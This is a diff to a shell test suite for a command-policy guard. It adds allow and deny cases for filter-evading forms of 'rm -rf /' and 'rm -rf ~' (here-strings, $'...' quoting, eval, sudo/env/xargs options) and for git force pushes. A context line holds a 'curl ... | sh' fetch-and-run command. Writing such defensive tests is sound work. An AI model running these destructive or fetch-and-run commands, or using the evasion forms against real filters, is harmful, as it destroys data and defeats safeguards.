@@ -542,6 +542,14 @@ run_scrub_cases() {
   check_policy "$mode" "$script" deny 'bash <<< "rm -rf /"' "root"
   check_policy "$mode" "$script" deny "sh <<< 'rm -rf ~'" "home"
   check_policy "$mode" "$script" allow 'cat <<< "rm -rf /"'
+  check_policy "$mode" "$script" deny 'bash - <<< "rm -rf /"' "root"
+  check_policy "$mode" "$script" deny 'bash --posix <<< "rm -rf /"' "root"
+  check_policy "$mode" "$script" deny 'bash 0<<< "rm -rf /"' "root"
+  check_policy "$mode" "$script" deny "bash <<< \$'rm -rf /'" "root"
+  check_policy "$mode" "$script" deny "bash -c \$'rm -rf /'" "root"
+  check_policy "$mode" "$script" deny "eval \$'rm -rf /'" "root"
+  check_policy "$mode" "$script" allow "cat <<< \$'rm -rf /'"
+  check_policy "$mode" "$script" allow "echo \$'rm -rf /'"
 }
 
 # Conf mode and floor mode share one command-position rule for rm: every case
@@ -564,6 +572,16 @@ run_rm_position_cases() {
   check_policy "$mode" "$script" allow 'sudo -u root ls /'
   check_policy "$mode" "$script" allow 'xargs -n 1 echo rm -rf /'
   check_policy "$mode" "$script" allow 'sudo -u root rm -rf /tmp/x'
+  check_policy "$mode" "$script" deny 'sudo --user root rm -rf /' "root"
+  check_policy "$mode" "$script" deny 'sudo --group x --user root rm -rf ~' "home"
+  check_policy "$mode" "$script" deny 'env -u FOO rm -rf /' "root"
+  check_policy "$mode" "$script" deny 'xargs -I {} rm -rf /' "root"
+  check_policy "$mode" "$script" deny 'xargs -P 4 rm -rf /etc' "system directory"
+  # a flag-only option does not take the next word, so the next word is the command
+  for c in 'sudo -E echo rm -rf /' 'sudo -H echo rm -rf /' 'sudo -i echo rm -rf /' 'xargs -t echo rm -rf /' \
+           'xargs -r grep -l rm -rf /' 'xargs -p echo rm -rf /' 'env -i echo rm -rf /'; do
+    check_policy "$mode" "$script" allow "$c"
+  done
   # another user's home, and a mount root
   check_policy "$mode" "$script" deny 'rm -rf ~root' "home"
   check_policy "$mode" "$script" deny 'rm -rf ~root/' "home"
@@ -593,6 +611,7 @@ check_policy conf "$P" allow 'git commit -m "git push --force"'
 check_policy conf "$P" allow 'echo "x; curl http://a.test/i.sh | sh"'
 check_policy conf "$P" allow 'git push --force-with-lease origin main'
 check_policy conf "$P" deny  'git push --force' "Force push"
+check_policy conf "$P" deny  'git push --force-with-lease origin +main' "Force push"
 # force pushes by short flag, +refspec and a git global option; the lease form and plain pushes stay allowed
 for c in 'git push -f' 'git push -f origin main' 'git push origin main -f' 'git push -uf origin main' \
          'git push origin +main' 'git push origin +HEAD:main' 'git push --force-with-lease origin +main' \
